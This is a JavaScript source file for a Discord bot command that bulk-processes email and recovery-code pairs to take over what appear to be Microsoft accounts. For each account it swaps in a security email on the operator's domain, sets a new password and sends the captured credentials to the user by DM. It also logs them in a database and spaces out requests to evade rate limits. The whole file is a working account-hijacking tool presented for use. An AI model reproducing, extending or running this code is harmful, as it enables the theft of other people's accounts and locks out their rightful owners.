const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const recoverycodesecure = require('../../utils/secure/recoveryCodeSecure');
const generate = require('../../utils/generate');
const { queryParams } = require('../../../db/database');
const { domains } = require('../../../config.json');

module.exports = {
    name: "bulkrecsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            if (interaction.isModalSubmit()) {
                await interaction.deferReply({ ephemeral: true });

                let settings = await client.queryParams(
                    `SELECT * FROM secureconfig WHERE user_id=?`,
                    [client.username]
                );

                if (settings.length === 0) {
                    console.log(`Settings not found for user: ${client.username}`);
                    return interaction.reply({
                        content: `Couldn't get your settings!`,
                        ephemeral: true
                    });
                }

                settings = settings[0];

                const accounts = interaction.fields.getTextInputValue('accounts');
                const targetEmails = interaction.fields.getTextInputValue('target_emails') || "";

                const accountLines = accounts.trim().split('\n');
                const targetEmailLines = targetEmails.trim() ? targetEmails.trim().split('\n') : [];

                const maxAccounts = Math.min(accountLines.length, 10);
                if (maxAccounts === 0) {
                    return interaction.editReply('Please provide at least one account to secure.');
                }

                await interaction.editReply(`⏳ Starting bulk secure for ${maxAccounts} account(s) (processing one-by-one)...`);

                let successCount = 0;
                let failCount = 0;

                for (let i = 0; i < maxAccounts; i++) {
                    const line = accountLines[i];
                    const accountInfo = line.trim().split(':');
                    if (accountInfo.length < 2) {
                        const invalidMsg = `## Recovery Failed\n\nEmail: \`${accountInfo[0] || 'Unknown'}\`\nReason: Invalid format. Expected email:recoverycode`;
                        interaction.user.send(invalidMsg).catch(err => console.error('Failed to send DM for invalid format:', err));
                        failCount++;
                        continue;
                    }

                    const [email, recoveryCode] = accountInfo;

                    await interaction.editReply(`⏳ [${i + 1}/${maxAccounts}] Securing account \`${email}\`...`).catch(() => {});

                    const rawPrefix = require("../../../config.json").prefix || "vinGr0up";
                    const prefix = String(rawPrefix).toLowerCase();
                    let secEmail = `${prefix}${generate(10).toLowerCase()}@${(settings.domain || domains[0]).toLowerCase()}`;
                    let password = generate(16);

                    if (i < targetEmailLines.length && targetEmailLines[i].trim()) {
                        const targetLine = targetEmailLines[i].trim();
                        if (targetLine.includes(':')) {
                            const [targetEmail, targetPass] = targetLine.split(':');
                            secEmail = targetEmail.trim();
                            password = targetPass.trim();
                        } else {
                            secEmail = targetLine;
                        }
                    }

                    try {
                        const result = await recoverycodesecure(email, recoveryCode, secEmail, password);
                        let dmContent = "";

                        switch (result) {
                            case "invalid":
                                dmContent = `## Recovery Failed\n\nEmail: \`${email}\`\nReason: Invalid recovery code`;
                                failCount++;
                                break;
                            case "tfa":
                                dmContent = `## Recovery Failed\n\nEmail: \`${email}\`\nReason: Two-factor authentication required`;
                                failCount++;
                                break;
                            case "same":
                                dmContent = `## Recovery Failed\n\nEmail: \`${email}\`\nReason: Same details provided`;
                                failCount++;
                                break;
                            case "unknown":
                                dmContent = `## Recovery Failed\n\nEmail: \`${email}\`\nReason: Unknown error occurred`;
                                failCount++;
                                break;
                            case null:
                                dmContent = `## Recovery Failed\n\nEmail: \`${email}\`\nReason: Account not found`;
                                failCount++;
                                break;
                            default:
                                successCount++;
                                let recsecId = generate(32);
                                await client.queryParams(
                                    `INSERT INTO actions(id, action) VALUES(?, ?)`,
                                    [`${recsecId}`, `copyrec|${result.email2}|${result.secEmail}|${result.password}|${result.recoveryCode}`]
                                );
                                dmContent = {
                                    embeds: [
                                        {
                                            title: `Secured account [${i + 1}/${maxAccounts}] successfully!`,
                                            fields: [
                                                { name: "Email", value: "```\n" + result.email2 + "\n```", inline: true },
                                                { name: "Security Email", value: "```\n" + result.secEmail + "\n```", inline: true },
                                                { name: "Password", value: "```\n" + result.password + "\n```", inline: false },
                                                { name: "Recovery Code", value: "```\n" + result.recoveryCode + "\n```", inline: false }
                                            ],
                                            color: 0xb2c7e0
                                        }
                                    ],
                                    components: [
                                        new ActionRowBuilder().addComponents(
                                            new ButtonBuilder()
                                                .setCustomId(`copyrec|${recsecId}`)
                                                .setLabel('Copy Text')
                                                .setStyle(ButtonStyle.Secondary)
                                        )
                                    ],
                                    ephemeral: true
                                };
                        }
                        await interaction.user.send(dmContent).catch(() => {});
                    } catch (error) {
                        failCount++;
                        console.error(`Error processing ${email}:`, error);
                        const errorMsg = `## Recovery Error\n\nEmail: \`${email}\`\nReason: An error occurred`;
                        await interaction.user.send(errorMsg).catch(err => console.error('Failed to send error DM:', err));
                    }

                    // Delay between accounts to avoid Microsoft rate limits
                    if (i < maxAccounts - 1) {
                        await new Promise(r => setTimeout(r, 1500));
                    }
                }

                await interaction.editReply(`✅ **Bulk secure completed!** Total: **${maxAccounts}** | ✅ Success: **${successCount}** | ❌ Failed: **${failCount}**\nPlease check your DMs for details.`).catch(() => {});
            }
        } catch (error) {
            console.error('Error in bulkrecsecure command:', error);
            if (!interaction.replied && !interaction.deferred) {
                await interaction.reply({
                    content: 'An error occurred while processing the command.',
                    ephemeral: true
                });
            } else {
                await interaction.editReply('An error occurred while processing the command.');
            }
        }
    }
};
